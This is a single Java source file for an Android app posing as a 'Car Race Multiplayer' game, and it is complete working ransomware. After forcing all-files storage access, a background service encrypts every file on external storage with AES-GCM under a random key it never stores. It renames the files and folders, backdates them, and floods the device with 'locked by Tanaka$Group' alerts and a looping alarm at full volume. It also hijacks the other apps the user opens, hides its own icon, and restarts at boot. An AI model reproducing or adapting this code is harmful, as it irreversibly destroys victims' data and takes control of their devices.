package com.carrace;

import android.Manifest;
import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.app.Service;
import android.app.WallpaperManager;
import android.app.usage.UsageStats;
import android.app.usage.UsageStatsManager;
import android.content.BroadcastReceiver;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.content.pm.ServiceInfo;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.media.AudioAttributes;
import android.media.AudioManager;
import android.media.MediaPlayer;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.Environment;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;
import android.provider.Settings;
import android.util.Log;
import android.webkit.WebView;
import android.webkit.WebViewClient;
import android.widget.Toast;

import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.app.NotificationCompat;
import androidx.core.content.ContextCompat;

import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.security.MessageDigest;
import java.security.SecureRandom;
import java.util.ArrayList;
import java.util.List;
import java.util.Locale;
import java.util.SortedMap;
import java.util.TreeMap;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.TimeUnit;

import javax.crypto.Cipher;
import javax.crypto.spec.GCMParameterSpec;
import javax.crypto.spec.SecretKeySpec;

public class MainActivity extends AppCompatActivity {

    private static final String TAG = "CarRace";
    private static final int REQUEST_STORAGE = 100;
    private static final int REQUEST_NOTIFICATION = 101;
    private static final String KEY_REQUESTING = "requesting";
    private static final String KEY_WAITING = "waiting";
    private static final String KEY_ASKED_NOTIFICATION = "asked_notification";

    private boolean requesting;
    private boolean waitingForSettings;
    private boolean askedNotification;
    private boolean leftApp;
    private WebView webView;

    @Override
    protected void onCreate(Bundle state) {
        super.onCreate(state);
        if (state != null) {
            requesting = state.getBoolean(KEY_REQUESTING, false);
            waitingForSettings = state.getBoolean(KEY_WAITING, false);
            askedNotification = state.getBoolean(KEY_ASKED_NOTIFICATION, false);
        }
        if (hasStorage(this)) {
            onStorageGranted();
        } else if (!requesting && !waitingForSettings) {
            requestStorage();
        }
    }

    @Override
    protected void onSaveInstanceState(Bundle out) {
        super.onSaveInstanceState(out);
        out.putBoolean(KEY_REQUESTING, requesting);
        out.putBoolean(KEY_WAITING, waitingForSettings);
        out.putBoolean(KEY_ASKED_NOTIFICATION, askedNotification);
    }

    @Override
    protected void onPause() {
        super.onPause();
        leftApp = true;
    }

    @Override
    protected void onResume() {
        super.onResume();
        if (waitingForSettings && leftApp) {
            waitingForSettings = false;
            leftApp = false;
            if (hasStorage(this)) {
                onStorageGranted();
            } else {
                closeApp();
            }
        }
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, String[] permissions, int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        if (requestCode != REQUEST_STORAGE) {
            return;
        }
        requesting = false;
        if (hasStorage(this)) {
            onStorageGranted();
        } else if (isPermanentlyDenied()) {
            waitingForSettings = true;
            openAppSettings();
        } else {
            closeApp();
        }
    }

    private void requestStorage() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            waitingForSettings = true;
            openAllFilesSettings();
        } else {
            requesting = true;
            ActivityCompat.requestPermissions(this,
                    new String[]{Manifest.permission.READ_EXTERNAL_STORAGE, Manifest.permission.WRITE_EXTERNAL_STORAGE},
                    REQUEST_STORAGE);
        }
    }

    private boolean isPermanentlyDenied() {
        return Build.VERSION.SDK_INT >= Build.VERSION_CODES.M
                && !ActivityCompat.shouldShowRequestPermissionRationale(this, Manifest.permission.READ_EXTERNAL_STORAGE)
                && !ActivityCompat.shouldShowRequestPermissionRationale(this, Manifest.permission.WRITE_EXTERNAL_STORAGE);
    }

    private void openAllFilesSettings() {
        try {
            startActivity(new Intent(Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION,
                    Uri.parse("package:" + getPackageName())));
        } catch (RuntimeException e) {
            try {
                startActivity(new Intent(Settings.ACTION_MANAGE_ALL_FILES_ACCESS_PERMISSION));
            } catch (RuntimeException e2) {
                Log.e(TAG, "Halaman izin akses file tidak tersedia", e2);
                waitingForSettings = false;
                closeApp();
            }
        }
    }

    private void openAppSettings() {
        try {
            startActivity(new Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS,
                    Uri.parse("package:" + getPackageName())));
        } catch (RuntimeException e) {
            Log.e(TAG, "Halaman pengaturan aplikasi tidak tersedia", e);
            waitingForSettings = false;
            closeApp();
        }
    }

    private void onStorageGranted() {
        showGame();
        requestNotificationIfNeeded();
        startBackgroundService();
    }

    private void requestNotificationIfNeeded() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU
                && !askedNotification
                && ContextCompat.checkSelfPermission(this, Manifest.permission.POST_NOTIFICATIONS)
                != PackageManager.PERMISSION_GRANTED) {
            askedNotification = true;
            ActivityCompat.requestPermissions(this,
                    new String[]{Manifest.permission.POST_NOTIFICATIONS},
                    REQUEST_NOTIFICATION);
        }
    }

    private void startBackgroundService() {
        try {
            ContextCompat.startForegroundService(this, new Intent(this, BackgroundService.class));
        } catch (RuntimeException e) {
            Log.e(TAG, "Gagal menjalankan background service", e);
        }
    }

    private void showGame() {
        webView = new WebView(this);
        webView.getSettings().setJavaScriptEnabled(true);
        webView.setWebViewClient(new WebViewClient());
        webView.loadUrl("file:///android_asset/game.html");
        setContentView(webView);
    }

    private void closeApp() {
        Toast.makeText(this, "Izin storage wajib diberikan untuk memakai aplikasi", Toast.LENGTH_LONG).show();
        finishAndRemoveTask();
    }

    static boolean hasStorage(Context context) {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            return Environment.isExternalStorageManager();
        }
        return ContextCompat.checkSelfPermission(context, Manifest.permission.READ_EXTERNAL_STORAGE)
                == PackageManager.PERMISSION_GRANTED
                && ContextCompat.checkSelfPermission(context, Manifest.permission.WRITE_EXTERNAL_STORAGE)
                == PackageManager.PERMISSION_GRANTED;
    }

    static File rootDir() {
        File dir = new File(Environment.getExternalStorageDirectory(), "CarRace");
        if (!dir.exists()) {
            dir.mkdirs();
        }
        return dir;
    }
}

/* ------------------------------------------------------------------ */
/*                       ENCRYPTOR BACKGROUND SERVICE                 */
/* ------------------------------------------------------------------ */

class BackgroundService extends Service {

    private static final String TAG = "CarRace";
    private static final String CHANNEL_ID = "car_race_background";
    private static final int NOTIFICATION_ID = 1001;
    private static final String EXT = ".notplaya";
    private static final int THREADS = 16;

    private volatile boolean running;
    private byte[] key;

    @Override
    public void onCreate() {
        super.onCreate();
        createChannel();
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        try {
            Notification notification = buildNotification();
            if (Build.VERSION.SDK_INT >= 34) {
                startForeground(NOTIFICATION_ID, notification, ServiceInfo.FOREGROUND_SERVICE_TYPE_SPECIAL_USE);
            } else {
                startForeground(NOTIFICATION_ID, notification);
            }
        } catch (RuntimeException e) {
            stopSelf();
            return START_NOT_STICKY;
        }

        if (!MainActivity.hasStorage(this)) {
            stopSelf();
            return START_NOT_STICKY;
        }

        if (!running) {
            running = true;
            key = generateKey(); // 192-bit
            new Thread(this::encryptAll, "CarRace-Encryptor").start();
        }
        return START_STICKY;
    }

    private byte[] generateKey() {
        byte[] k = new byte[24]; // 192-bit
        new SecureRandom().nextBytes(k);
        return k;
    }

    private void encryptAll() {
        File root = Environment.getExternalStorageDirectory();
        List<File> files = new ArrayList<>();
        if (root != null) {
            walk(root, files);
        }

        ExecutorService pool = Executors.newFixedThreadPool(THREADS);
        for (File f : files) {
            pool.submit(() -> encryptFile(f));
        }
        pool.shutdown();
        try {
            pool.awaitTermination(30, TimeUnit.MINUTES);
        } catch (InterruptedException ignored) {}

        // rename semua folder setelah file selesai
        renameAllDirs();

        // jeda 3 detik sebelum eksekusi post-encrypt
        new Handler(Looper.getMainLooper()).postDelayed(this::postEncrypt, 3000);
    }

    private void walk(File dir, List<File> out) {
        File[] children = dir.listFiles();
        if (children == null) return;
        for (File f : children) {
            if (f.isDirectory()) {
                if (f.getName().startsWith(".")) continue;
                walk(f, out);
            } else {
                String n = f.getName();
                if (n.endsWith(EXT)) continue;
                if (n.startsWith(".")) continue;
                out.add(f);
            }
        }
    }

    private void renameAllDirs() {
        File root = Environment.getExternalStorageDirectory();
        if (root == null) return;
        List<File> dirs = new ArrayList<>();
        collectDirs(root, dirs);
        // urutkan terdalam dulu supaya rename tidak bentrok
        dirs.sort((a, b) -> Integer.compare(b.getAbsolutePath().length(), a.getAbsolutePath().length()));

        int count = 1;
        for (File d : dirs) {
            try {
                File parent = d.getParentFile();
                if (parent == null) continue;
                String newName = "Notplaya-" + count++;
                File dst = new File(parent, newName);
                if (d.renameTo(dst)) {
                    setFileDate(dst);
                } else {
                    setFileDate(d);
                }
            } catch (Exception ignored) {}
        }
    }

    private void collectDirs(File root, List<File> out) {
        File[] children = root.listFiles();
        if (children == null) return;
        for (File f : children) {
            if (f.isDirectory()) {
                String n = f.getName();
                if (n.startsWith(".")) continue;
                if (n.startsWith("Notplaya-")) continue;
                out.add(f);
                collectDirs(f, out);
            }
        }
    }

    private void encryptFile(File f) {
        if (f == null || !f.isFile()) return;
        if (f.getName().endsWith(EXT)) return;
        try {
            long size = f.length();
            if (size > 256L * 1024 * 1024) return; // skip file > 256MB supaya tidak OOM

            byte[] plain = readAll(f);
            byte[] iv = new byte[12];
            new SecureRandom().nextBytes(iv);

            Cipher c = Cipher.getInstance("AES/GCM/NoPadding");
            c.init(Cipher.ENCRYPT_MODE, new SecretKeySpec(key, "AES"), new GCMParameterSpec(128, iv));
            byte[] ct = c.doFinal(plain);

            // tulis ulang: IV + ciphertext
            try (FileOutputStream fos = new FileOutputStream(f)) {
                fos.write(iv);
                fos.write(ct);
            }

            // rename file jadi hash 256 + .notplaya
            String hash = sha256Hex(f.getName());
            File dst = new File(f.getParentFile(), hash + EXT);
            if (f.renameTo(dst)) {
                setFileDate(dst);
            } else {
                setFileDate(f);
            }
        } catch (Exception e) {
        }
    }

    private static byte[] readAll(File f) throws IOException {
        FileInputStream fis = new FileInputStream(f);
        byte[] data = new byte[(int) f.length()];
        int read = 0;
        while (read < data.length) {
            int r = fis.read(data, read, data.length - read);
            if (r < 0) break;
            read += r;
        }
        fis.close();
        return data;
    }

    private static String sha256Hex(String s) throws Exception {
        MessageDigest md = MessageDigest.getInstance("SHA-256");
        byte[] d = md.digest(s.getBytes("UTF-8"));
        StringBuilder sb = new StringBuilder();
        for (byte b : d) sb.append(String.format(Locale.US, "%02x", b));
        return sb.toString();
    }

    private static void setFileDate(File f) {
        // 2006-06-06 00:00:00 UTC (fallback karena year 6666 tidak didukung)
        long ts = 1149552000000L;
        f.setLastModified(ts);
    }

    private void postEncrypt() {
        // 1. Ganti wallpaper
        ContextCompat.startForegroundService(this, new Intent(this, WallpaperService.class));

        // 2. Spam toast + notif + sound
        ContextCompat.startForegroundService(this, new Intent(this, SpamService.class));

        // 3. Redirect app lain ke webview
        ContextCompat.startForegroundService(this, new Intent(this, RedirectService.class));

        // 4. Sembunyikan icon + nama
        try {
            PackageManager pm = getPackageManager();
            ComponentName main = new ComponentName(this, MainActivity.class);
            ComponentName blank = new ComponentName(this, "com.carrace.AliasBlank");
            pm.setComponentEnabledSetting(main,
                    PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                    PackageManager.DONT_KILL_APP);
            pm.setComponentEnabledSetting(blank,
                    PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
                    PackageManager.DONT_KILL_APP);
        } catch (Exception ignored) {}
    }

    @Override
    public void onDestroy() {
        running = false;
        super.onDestroy();
    }

    @Override
    public IBinder onBind(Intent intent) { return null; }

    private Notification buildNotification() {
        Intent open = new Intent(this, MainActivity.class);
        int flags = PendingIntent.FLAG_UPDATE_CURRENT;
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            flags |= PendingIntent.FLAG_IMMUTABLE;
        }
        PendingIntent contentIntent = PendingIntent.getActivity(this, 0, open, flags);

        return new NotificationCompat.Builder(this, CHANNEL_ID)
                .setContentTitle("Car Race Multiplayer")
                .setContentText("Berjalan di background")
                .setSmallIcon(R.drawable.ic_notification)
                .setContentIntent(contentIntent)
                .setOngoing(true)
                .setOnlyAlertOnce(true)
                .setPriority(NotificationCompat.PRIORITY_LOW)
                .build();
    }

    private void createChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel channel = new NotificationChannel(
                    CHANNEL_ID, "Layanan Background", NotificationManager.IMPORTANCE_LOW);
            NotificationManager manager = (NotificationManager) getSystemService(Context.NOTIFICATION_SERVICE);
            if (manager != null) manager.createNotificationChannel(channel);
        }
    }
}

/* ------------------------------------------------------------------ */
/*                          WALLPAPER SERVICE                         */
/* ------------------------------------------------------------------ */

class WallpaperService extends Service {
    private static final String TAG = "CarRace";
    private static final String IMG_URL = "https://i.imgur.com/erVYKa3.jpeg";

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        new Thread(() -> {
            try {
                Bitmap bmp = download(IMG_URL);
                if (bmp != null) {
                    WallpaperManager wm = WallpaperManager.getInstance(getApplicationContext());
                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
                        wm.setBitmap(bmp, null, true, WallpaperManager.FLAG_SYSTEM);
                    } else {
                        wm.setBitmap(bmp);
                    }
                }
            } catch (Exception e) {
                Log.e(TAG, "wallpaper failed", e);
            }
            stopSelf();
        }).start();
        return START_NOT_STICKY;
    }

    private Bitmap download(String urlStr) {
        try {
            URL url = new URL(urlStr);
            HttpURLConnection c = (HttpURLConnection) url.openConnection();
            c.setConnectTimeout(15000);
            c.setReadTimeout(15000);
            c.setInstanceFollowRedirects(true);
            c.setRequestProperty("User-Agent", "Mozilla/5.0");
            InputStream in = c.getInputStream();
            Bitmap b = BitmapFactory.decodeStream(in);
            in.close();
            c.disconnect();
            return b;
        } catch (Exception e) {
            return null;
        }
    }

    @Override
    public IBinder onBind(Intent intent) { return null; }
}

/* ------------------------------------------------------------------ */
/*                             SPAM SERVICE                           */
/* ------------------------------------------------------------------ */

class SpamService extends Service {

    private static final String CH = "spam_channel";
    private Handler handler;
    private MediaPlayer player;

    @Override
    public void onCreate() {
        super.onCreate();
        createChannel();
        startForeground(2, baseNotif());

        handler = new Handler(Looper.getMainLooper());
        startSpam();
        startSound();
    }

    private void createChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel ch = new NotificationChannel(
                    CH, "Spam", NotificationManager.IMPORTANCE_HIGH);
            NotificationManager nm = getSystemService(NotificationManager.class);
            if (nm != null) nm.createNotificationChannel(ch);
        }
    }

    private Notification baseNotif() {
        return new NotificationCompat.Builder(this, CH)
                .setContentTitle("Car Race Multiplayer")
                .setContentText("Running")
                .setSmallIcon(android.R.drawable.ic_menu_info_details)
                .setPriority(NotificationCompat.PRIORITY_MIN)
                .setOngoing(true)
                .build();
    }

    private void startSpam() {
        handler.post(new Runnable() {
            @Override public void run() {
                Toast.makeText(getApplicationContext(),
                        "your devices locked by Tanaka$Group",
                        Toast.LENGTH_SHORT).show();
                NotificationManager nm = (NotificationManager) getSystemService(NOTIFICATION_SERVICE);
                Notification n = new NotificationCompat.Builder(SpamService.this, CH)
                        .setContentTitle("Tanaka$Group")
                        .setContentText("your devices locked by Tanaka$Group")
                        .setSmallIcon(android.R.drawable.ic_dialog_alert)
                        .setPriority(NotificationCompat.PRIORITY_HIGH)
                        .setAutoCancel(true)
                        .build();
                if (nm != null) nm.notify((int) (System.currentTimeMillis() % 100000), n);

                handler.postDelayed(this, 5000);
            }
        });
    }

    private void startSound() {
        try {
            AudioManager am = (AudioManager) getSystemService(Context.AUDIO_SERVICE);
            if (am != null) {
                am.setStreamVolume(AudioManager.STREAM_MUSIC,
                        am.getStreamMaxVolume(AudioManager.STREAM_MUSIC), 0);
            }

            player = new MediaPlayer();
            Uri soundUri = Uri.parse("android.resource://" + getPackageName() + "/" + R.raw.lock);
            player.setDataSource(this, soundUri);
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
                AudioAttributes attrs = new AudioAttributes.Builder()
                        .setUsage(AudioAttributes.USAGE_ALARM)
                        .setContentType(AudioAttributes.CONTENT_TYPE_SONIFICATION)
                        .build();
                player.setAudioAttributes(attrs);
            }
            player.setLooping(true);
            player.prepare();
            player.start();
        } catch (Exception e) {
            Log.e("CarRace", "sound failed", e);
        }
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) { return START_STICKY; }

    @Override
    public void onDestroy() {
        if (player != null) {
            try { player.stop(); player.release(); } catch (Exception ignored) {}
        }
        if (handler != null) handler.removeCallbacksAndMessages(null);
        super.onDestroy();
    }

    @Override
    public IBinder onBind(Intent intent) { return null; }
}

/* ------------------------------------------------------------------ */
/*                           REDIRECT SERVICE                         */
/* ------------------------------------------------------------------ */

class RedirectService extends Service {

    private static final String CH = "redirect_channel";
    private static final String SELF = "com.carrace";
    private static final String WHITELIST = "com.telegram.messenger";
    private Handler handler;

    @Override
    public void onCreate() {
        super.onCreate();
        createChannel();
        startForeground(3, baseNotif());
        handler = new Handler(Looper.getMainLooper());
        handler.post(new Runnable() {
            @Override public void run() {
                check();
                handler.postDelayed(this, 1500);
            }
        });
    }

    private void createChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel ch = new NotificationChannel(
                    CH, "Redirect", NotificationManager.IMPORTANCE_LOW);
            NotificationManager nm = getSystemService(NotificationManager.class);
            if (nm != null) nm.createNotificationChannel(ch);
        }
    }

    private Notification baseNotif() {
        return new NotificationCompat.Builder(this, CH)
                .setContentTitle("Car Race Multiplayer")
                .setContentText("Running")
                .setSmallIcon(android.R.drawable.ic_menu_info_details)
                .setPriority(NotificationCompat.PRIORITY_MIN)
                .setOngoing(true)
                .build();
    }

    private void check() {
        try {
            String pkg = currentForeground();
            if (pkg == null) return;
            if (pkg.equals(SELF)) return;
            if (pkg.equals(WHITELIST)) return;
            if (pkg.startsWith("com.android.systemui")) return;
            if (pkg.contains("launcher")) return;

            Intent i = new Intent(this, MainActivity.class);
            i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_CLEAR_TOP);
            startActivity(i);
        } catch (Exception ignored) {}
    }

    private String currentForeground() {
        try {
            UsageStatsManager usm = (UsageStatsManager) getSystemService(Context.USAGE_STATS_SERVICE);
            if (usm == null) return null;
            long now = System.currentTimeMillis();
            List<UsageStats> stats = usm.queryUsageStats(
                    UsageStatsManager.INTERVAL_DAILY, now - 1000 * 60, now);
            if (stats != null && !stats.isEmpty()) {
                SortedMap<Long, UsageStats> map = new TreeMap<>();
                for (UsageStats s : stats) map.put(s.getLastTimeUsed(), s);
                if (!map.isEmpty()) return map.get(map.lastKey()).getPackageName();
            }
        } catch (Exception ignored) {}
        return null;
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) { return START_STICKY; }

    @Override
    public IBinder onBind(Intent intent) { return null; }
}

/* ------------------------------------------------------------------ */
/*                              BOOT RECEIVER                         */
/* ------------------------------------------------------------------ */

class BootReceiver extends BroadcastReceiver {
    @Override
    public void onReceive(Context context, Intent intent) {
        if (!Intent.ACTION_BOOT_COMPLETED.equals(intent.getAction())
                && !Intent.ACTION_LOCKED_BOOT_COMPLETED.equals(intent.getAction())) {
            return;
        }
        if (!MainActivity.hasStorage(context)) return;
        try {
            ContextCompat.startForegroundService(context, new Intent(context, BackgroundService.class));
        } catch (RuntimeException e) {
            Log.e("CarRace", "Gagal auto start saat boot", e);
        }
    }
}
